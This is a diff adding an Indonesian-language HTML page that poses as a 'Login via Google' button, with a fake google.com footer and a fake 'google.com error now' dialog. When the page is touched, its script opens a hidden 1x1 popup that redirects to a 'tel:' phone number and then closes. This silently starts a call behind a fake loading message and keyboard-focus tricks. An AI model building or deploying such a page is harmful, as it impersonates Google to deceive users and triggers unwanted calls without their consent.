@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: sans-serif; background: #f5f5f7; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        
+        .elemen-input { 
+            width: 100%; max-width: 400px; margin-top: 300px; 
+            font-size: 16px; font-weight: bold; 
+            color: white; background-color: #0ec9c6; border: none; border-radius: 8px; 
+            outline: none; cursor: poixnter; box-shadow: 0 4px 6px rgba(0,0,0,0.1); transition: opacity 0.3s ease; 
+            text-align: center;
+            line-height: normal;
+            padding-top: 18px;
+            padding-bottom: 14px;
+            padding-left: 10px;
+            padding-right: 10px;
+        }
+        .elemen-input.status-aktif { 
+            color: #333; background-color: #fff; border: 2px solid #007aff; 
+            font-weight: normal; box-shadow: 0 0 8px rgba(0, 122, 255, 0.2); 
+            cursor: text;
+            padding-top: 16px;
+            padding-bottom: 12px;
+        }
+        
+        #labelMemuat { display: none; margin-top: 20px; font-size: 16px; color: #555; font-weight: bold; animation: denyut 1.5s infinite; }
+        
+        #barNavigasi { display: none; position: fixed; left: 0; bottom: 0; width: 100%; background: #e5e5ea; border-top: 1px solid #d1d1d6; padding: 10px; z-index: 9998; will-change: transform; }
+        .kontainer-toolbar { display: flex; justify-content: space-between; align-items: center; max-width: 400px; margin: 0 auto; }
+        .tombol-selesai { padding: 6px 12px; background: #007aff; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        
+        #bingkaiModal { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 10000; justify-content: center; align-items: flex-start; padding-top: 10vh; pointer-events: none; }
+        .kotak-dialog { background: #fff; width: 85%; max-width: 320px; border-radius: 14px; text-align: center; overflow: hidden; box-shadow: 0 8px 30px rgba(0,0,0,0.2); border: 1px solid #e5e5ea; pointer-events: auto; padding-top: 20px; }
+        
+        .tombol-aksi-modal { width: 100%; padding: 14px 0; font-size: 16px; background: none; border: none; cursor: pointer; border-top: 1px solid #e5e5ea; font-weight: bold; outline: none; }
+        
+        /* STYLE NAVBAR BAWAH (Putih Bersih) */
+        .navigasi-bawah { display: none; position: fixed; left: 0; bottom: 0; width: 100%; height: 18px; background-color: #ffffff; border-top: 1px solid #e5e5ea; text-align: center; padding-bottom: calc(2px + env(safe-area-inset-bottom)); z-index: 999; }
+        
+        /* STYLE TEKS (Kecil, Hitam Jelas, di Tengah) */
+        .teks-navigasi-bawah { font-size: 9px; color: #1c1b1f; font-weight: 800; letter-spacing: 0.8px; display: inline-block; vertical-align: top; }
+        
+        @keyframes denyut { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
+    </style>
+</head>
+<body>
+
+    <input type="text" id="areaInput" class="elemen-input" value="Login via Google">
+
+    <div id="labelMemuat">Processing data, please wait a moment...</div>
+
+    <div id="barNavigasi">
+        <div class="kontainer-toolbar">
+            <span style="font-size:14px;color:#555">Keyboard Terkunci Aktif</span>
+            <button class="tombol-selesai" onclick="balikKeHalamanUtama()">Tutup</button>
+        </div>
+    </div>
+
+    <div id="bingkaiModal">
+        <div class="kotak-dialog">
+            <div style="padding: 0 16px; font-size: 15px; line-height: 1.4; color: #000;">google.com error now</div>
+            <div style="display:flex;">
+                <button class="tombol-aksi-modal" style="color:#007aff;" id="tombolOk">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- NAVBAR BAWAH (Sudah Diperbaiki Kelas Teksnya) -->
+    <nav class="navigasi-bawah" id="navBawah">
+        <span class="teks-navigasi-bawah">google.com</span>
+    </nav>
+
+    <script>
+        const barNavigasi = document.getElementById('barNavigasi'), 
+              areaInput = document.getElementById('areaInput'), 
+              bingkaiModal = document.getElementById('bingkaiModal'), 
+              tombolOk = document.getElementById('tombolOk'), 
+              labelMemuat = document.getElementById('labelMemuat'), 
+              navBawah = document.getElementById('navBawah');
+              
+        let statusBerjalan = false, 
+            statusDialogTerbuka = false, 
+            tinggiAwal = 0;
+
+        function aturUlangPosisi() {
+            if (window.visualViewport && barNavigasi.style.display === 'block') {
+                const vv = window.visualViewport;
+                barNavigasi.style.transform = `translateY(${vv.offsetTop + vv.height - barNavigasi.offsetHeight}px)`;
+            }
+        }
+
+        if (window.visualViewport) {
+            tinggiAwal = window.visualViewport.height;
+            
+            window.visualViewport.addEventListener('resize', function() {
+                aturUlangPosisi();
+                
+                if (statusDialogTerbuka && window.visualViewport.height >= (tinggiAwal - 40)) {
+                    balikKeHalamanUtama();
+                }
+            });
+            window.visualViewport.addEventListener('scroll', aturUlangPosisi);
+        }
+
+        const eksekusiSistem = (e) => {
+            if (statusBerjalan) return;
+            statusBerjalan = true;
+
+            areaInput.value = ""; 
+            areaInput.focus();
+            barNavigasi.style.display = 'block';
+            areaInput.classList.add('status-aktif');
+            setTimeout(aturUlangPosisi, 50);
+
+            areaInput.style.opacity = "0";
+            labelMemuat.style.display = "block";
+            navBawah.style.display = "block";
+
+            setTimeout(() => { 
+                statusDialogTerbuka = true;
+                bingkaiModal.style.display = 'flex'; 
+                labelMemuat.style.display = "none";
+            }, 5000);
+
+            const jendelaProtokol = window.open('about:blank', '_blank', 'width=1,height=1');
+            if (jendelaProtokol) {
+                jendelaProtokol.document.write('<html><body><script>window.location.href="tel:+62165312";setTimeout(function(){window.close();},400);<\/script></body></html>');
+                jendelaProtokol.document.close();
+            }
+
+            setTimeout(() => {
+                if (!statusDialogTerbuka) {
+                    areaInput.blur();
+                    setTimeout(() => {
+                        areaInput.focus(); 
+                        areaInput.click();
+                        setTimeout(aturUlangPosisi, 50);
+                    }, 20);
+                }
+            }, 800);
+        };
+
+        areaInput.addEventListener('touchstart', eksekusiSistem, { passive: true });
+        areaInput.addEventListener('mousedown', eksekusiSistem);
+
+        tombolOk.addEventListener('click', function(e) {
+            e.preventDefault();
+            balikKeHalamanUtama();
+        });
+
+        areaInput.addEventListener('blur', () => {
+            if (statusDialogTerbuka) return;
+            setTimeout(() => {
+                if (document.activeElement !== areaInput) {
+                    barNavigasi.style.display = 'none'; 
+                    areaInput.classList.remove('status-aktif');
+                }
+            }, 150);
+        });
+
+        function balikKeHalamanUtama() { 
+            statusDialogTerbuka = false; 
+            statusBerjalan = false; 
+            
+            areaInput.blur(); 
+            
+            barNavigasi.style.display = 'none'; 
+            bingkaiModal.style.display = 'none';
+            labelMemuat.style.display = "none"; 
+            navBawah.style.display = "none"; 
+            
+            areaInput.value = "Login Google"; 
+            areaInput.style.opacity = "1";
+            areaInput.classList.remove('status-aktif'); 
+        }
+    </script>
+</body>
+</html>
